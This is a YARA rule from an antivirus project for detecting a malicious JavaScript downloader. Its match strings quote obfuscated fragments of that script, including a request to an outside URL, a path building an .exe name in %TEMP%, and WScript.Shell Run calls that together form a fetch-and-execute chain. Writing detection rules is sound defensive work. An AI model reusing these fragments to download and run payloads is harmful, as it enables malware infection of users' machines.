rule sig_20160328_7aabe575e3f38a274333a5335346b6e3 {
  meta:
    description = "datamaliciousorder - file 20160328_7aabe575e3f38a274333a5335346b6e3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2e2ad8609a29f96e0b8c5e592659dda32808731915eb4a3f3096d38ebfd0aa91"

  strings:
    $s1  = "function Nhboxtapmu() {return Idwhmcjgsz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"sU2qh6xtY3GH5f5.exe\";};" fullword ascii
    $s2  = "Ejisvypz[Rllqzqol](\"GET\", \"http://www.hiveclick.com/m4usd\", false);" fullword ascii
    $s3  = "do {WScript[Cixrkc](Wufpua() * 11)} while (Ejisvypz[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Idwhmcjgsz = function Ijfnv() {return WScript[Typcf](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Kgzyt(Zisemzga, Fqhcm){return Zisemzga - Fqhcm;};" fullword ascii
    $s6  = "function Oxwgsxw(Kztjcwvdj){Idwhmcjgsz[\"Run\"](Kztjcwvdj, Msoratb, Msoratb);};" fullword ascii
    $s7  = "function Wtznkedv() {return ((Emqpay == true) && (Emqpay == Upmuaegvsc)) ? 1 : Msoratb;};" fullword ascii
    $s8  = "var Hsfsywlss = false;" fullword ascii
    $s9  = "return Kgzyt(Eabgfkabz, Psvaxopku);" fullword ascii
    $s10 = "var Qciobsmu = new this[\"Date\"]();" fullword ascii
    $s11 = "var Emqpay = false;" fullword ascii
    $s12 = "Emqpay = true; " fullword ascii
    $s13 = " while (Nxjigbo){" fullword ascii
    $s14 = "var Upmuaegvsc = false;" fullword ascii
    $s15 = "function Gesfidqq(){return Typcf;};" fullword ascii
    $s16 = "function Rlsxde(){return Qvqusxebj;};" fullword ascii
    $s17 = "function Wufpua(){return 22;};" fullword ascii
    $s18 = "function Txzsxed()" fullword ascii
    $s19 = "Upmuaegvsc = true; " fullword ascii
    $s20 = "function Ymljrynfvs(Dwbirzqlgr) {var Vrerltw = (1, 2, 3, 4, 5, Dwbirzqlgr); return Vrerltw;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}